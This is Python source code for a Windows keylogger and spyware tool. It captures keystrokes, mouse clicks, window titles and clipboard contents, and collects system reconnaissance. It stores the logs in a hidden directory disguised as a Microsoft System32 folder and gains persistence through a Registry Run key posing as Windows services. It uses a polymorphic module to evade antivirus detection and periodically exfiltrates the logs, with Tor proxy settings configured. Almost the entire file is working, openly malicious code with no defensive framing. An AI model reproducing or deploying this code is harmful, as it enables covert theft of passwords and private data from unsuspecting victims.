#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os, time, random, string, base64, json

# Attempts to load a local polymorphic_evasion module to provide dynamic 
# signatures and behavioral obfuscation to bypass static/heuristic analysis.
try:
    from polymorphic_evasion import get_polymorphic_context, DynamicLoader
    poly_ctx = get_polymorphic_context()
    _has_poly = True
except Exception:
    poly_ctx = None
    DynamicLoader = None
    _has_poly = False

# To evade simple Import Address Table (IAT) scanning, critical modules are 
# loaded dynamically using a custom loader if the polymorphic engine is active.
if _has_poly and poly_ctx and DynamicLoader:
    try:
        # Load Windows Registry manipulation functions dynamically
        winreg_module = DynamicLoader.load_module('winreg')
        if winreg_module:
            OpenKey = getattr(winreg_module, 'OpenKey', None)
            SetValueEx = getattr(winreg_module, 'SetValueEx', None)
            CloseKey = getattr(winreg_module, 'CloseKey', None)
            HKEY_CURRENT_USER = getattr(winreg_module, 'HKEY_CURRENT_USER', None)
            KEY_ALL_ACCESS = getattr(winreg_module, 'KEY_ALL_ACCESS', None)
            REG_SZ = getattr(winreg_module, 'REG_SZ', None)
        else:
            from winreg import *
    except:
        from winreg import *
else:
    from winreg import *

# Load input monitoring library (pynput) dynamically
if _has_poly and poly_ctx and DynamicLoader:
    try:
        pynput_module = DynamicLoader.load_module('pynput')
        if pynput_module:
            keyboard = getattr(pynput_module, 'keyboard', None)
            mouse_mod = getattr(pynput_module, 'mouse', None)
            mouse = mouse_mod
            Button = getattr(mouse_mod, 'Button', None)
            MouseListener = getattr(mouse_mod, 'Listener', None)
            KeyListener = getattr(getattr(pynput_module, 'keyboard', None), 'Listener', None)
        else:
            from pynput import keyboard, mouse
            from pynput.mouse import Button, Listener as MouseListener
            from pynput.keyboard import Listener as KeyListener
    except:
        from pynput import keyboard, mouse
        from pynput.mouse import Button, Listener as MouseListener
        from pynput.keyboard import Listener as KeyListener
else:
    from pynput import keyboard, mouse
    from pynput.mouse import Button, Listener as MouseListener
    from pynput.keyboard import Listener as KeyListener

# Load window management library dynamically
if _has_poly and poly_ctx and DynamicLoader:
    try:
        gw_module = DynamicLoader.load_module('pygetwindow')
        if gw_module:
            gw = gw_module
        else:
            import pygetwindow as gw
    except:
        import pygetwindow as gw
else:
    import pygetwindow as gw

# Standard library imports and custom helper modules
import shutil
import requests
import socks
import socket
import Sender_setup
import system_recon
import clipboard_monitor

# --- Global Configuration & State ---
global t, start_time, onion_address, tor_proxy_host, tor_proxy_port, interval
t = ""  # In-memory log buffer

# Determine the log filename (randomized if polymorphic engine is present)
if poly_ctx:
    log_filename = poly_ctx.get_log_filename()
else:
    log_filename = 'SystemLog.dat'

# Define path for data persistence in a hidden system-like directory
HIDDEN_DIR = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'System32')
LOG_FILE = os.path.join(HIDDEN_DIR, log_filename)

# Network parameters for data exfiltration via Tor
tor_proxy_host = "127.0.0.1"
tor_proxy_port = 9050
interval = 60  # Default exfiltration frequency (seconds)

# Operational settings
IMMEDIATE_DISK_FLUSH = True  # Write to disk immediately for data safety
MIN_BUFFER_FLUSH = 50        # Threshold for batch writes if not forcing

# Ensures the hidden directory exists and sets the 'Hidden' attribute on Windows
try:
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
    try:
        import ctypes
        # Set file attribute to 0x02 (Hidden)
        ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_DIR, 0x02)
    except:
        pass
    # Initialize/Touch the log file
    f = open(LOG_FILE, 'a')
    f.close()
except:
    try:
        f = open(LOG_FILE, 'w')
        f.close()
    except:
        # Last resort fallback if AppData is restricted
        f = open('Logfile.txt', 'w')
        f.close()

def addStartup():
    """
    Achieves persistence by adding the script to the Windows Registry 'Run' key.
    Uses randomized names to blend in with legitimate system services.
    """
    try:
        if poly_ctx:
            poly_ctx.add_random_delay()
        
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split('\\')[-1]
        new_file_path = fp + '\\' + file_name
        
        # Pick a deceptive name for the registry entry
        if poly_ctx:
            registry_name = poly_ctx.get_registry_name()
        else:
            registry_names = [
                "Windows Security Update",
                "Microsoft System Service",
                "Windows Defender Service",
                "System Configuration Manager",
                "Windows Update Service"
            ]
            registry_name = random.choice(registry_names)
        
        # Write to CurrentVersion\Run for automatic execution on login
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, registry_name, 0, REG_SZ, new_file_path)
        CloseKey(key2change)
        
        if poly_ctx:
            poly_ctx.add_random_delay()
    except Exception:
        pass

# Execute persistence and stealth routines
addStartup()

# Collects hardware, OS, and network information upon startup
try:
    recon = system_recon.SystemRecon()
    recon_report = recon.formatted_report()
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(recon_report)
    t = recon_report 
except Exception:
    pass

def clipboard_callback(text):
    """Callback triggered whenever new text is copied to the clipboard."""
    global t
    t = t + text
    flush_log_buffer()

try:
    clip_monitor = clipboard_monitor.ClipboardMonitor(clipboard_callback)
    clip_monitor.start()
except Exception:
    pass

def flush_log_buffer(force=False):
    """
    Writes the in-memory string buffer to the physical log file on disk.
    Supports conditional flushing based on buffer size or manual override.
    """
    global t, LOG_FILE
    
    if not t:
        return
    
    if not force and len(t) < MIN_BUFFER_FLUSH:
        return
    
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(t)
    except:
        with open('Logfile.txt', 'a', encoding='utf-8') as f:
            f.write(t)
    finally:
        t = ''

def Mail_it_Log_File():
    """
    Initiates the data exfiltration process using the Sender_setup module.
    Includes polymorphic delays to avoid traffic pattern analysis.
    """
    global LOG_FILE, HIDDEN_DIR
    if poly_ctx:
        poly_ctx.add_random_delay(0, 50)
    
    try:
        Sender_setup.start_sender(LOG_FILE)
    except Exception:
        pass

def get_window_name():
    """Retrieves the title of the currently active foreground window."""
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title if active_window.title else "Unknown"
        return "Unknown"
    except Exception:
        return "Unknown"

def OnMouseEvent(x, y, button, pressed):
    """
    Handles mouse click events. Records the timestamp, active window, 
    button pressed, and coordinates.
    """
    global t, start_time, interval, LOG_FILE

    # Behavioral evasion: occasionally skip logging to mimic human inconsistency
    if poly_ctx and not poly_ctx.behavioral.should_perform_action(0.95):
        return True
    
    if pressed:
        if poly_ctx:
            poly_ctx.add_random_delay(0, 10)
        
        window_name = get_window_name()
        data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
            + ' WindowName : ' + window_name
        data += '\n\tButton:' + str(button)
        data += '\n\tClicked in (Position):(' + str(x) + ',' + str(y) + ')'
        data += '\n===================='

        t = t + data

        # Manage buffer flushing and exfiltration timing
        buffer_size = poly_ctx.buffer_size if poly_ctx else 500
        if len(t) > buffer_size:
            flush_log_buffer(force=True)
        else:
            flush_log_buffer(force=IMMEDIATE_DISK_FLUSH)

        current_interval = interval
        if poly_ctx:
            current_interval = int(poly_ctx.behavioral.random_interval(interval, 15))

        if int(time.time() - start_time) >= int(current_interval):
            flush_log_buffer(force=True)
            Mail_it_Log_File()
            start_time = time.time()
            if poly_ctx and random.random() < 0.3:
                poly_ctx.mutate_config()

    return True

def OnKeyboardEvent(key):
    """
    Handles keystroke events. Records the timestamp, active window, and the key pressed.
    """
    global t, start_time, interval, LOG_FILE
    
    if poly_ctx and not poly_ctx.behavioral.should_perform_action(0.98):
        return True
    
    try:
        if poly_ctx:
            poly_ctx.add_random_delay(0, 5)
        
        window_name = get_window_name()
        key_str = str(key).replace("'", "")
        data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
            + ' WindowName : ' + window_name
        data += '\n\tKeyboard key :' + key_str
        data += '\n===================='
        
        t = t + data

        buffer_size = poly_ctx.buffer_size if poly_ctx else 500
        if len(t) > buffer_size:
            flush_log_buffer(force=True)
        else:
            flush_log_buffer(force=IMMEDIATE_DISK_FLUSH)

        current_interval = interval
        if poly_ctx:
            current_interval = int(poly_ctx.behavioral.random_interval(interval, 15))

        if int(time.time() - start_time) >= int(current_interval):
            flush_log_buffer(force=True)
            Mail_it_Log_File()
            start_time = time.time()
            if poly_ctx and random.random() < 0.3:
                poly_ctx.mutate_config()
            
    except Exception:
        pass
    
    return True

# --- Main Execution Loop ---
start_time = time.time()

# Initialize background listeners for user input
key_listener = KeyListener(on_press=OnKeyboardEvent)
key_listener.start()

mouse_listener = MouseListener(on_click=OnMouseEvent)
mouse_listener.start()

# Keep the main thread alive until termination signal
try:
    key_listener.join()
    mouse_listener.join()
except KeyboardInterrupt:
    key_listener.stop()
    mouse_listener.stop()
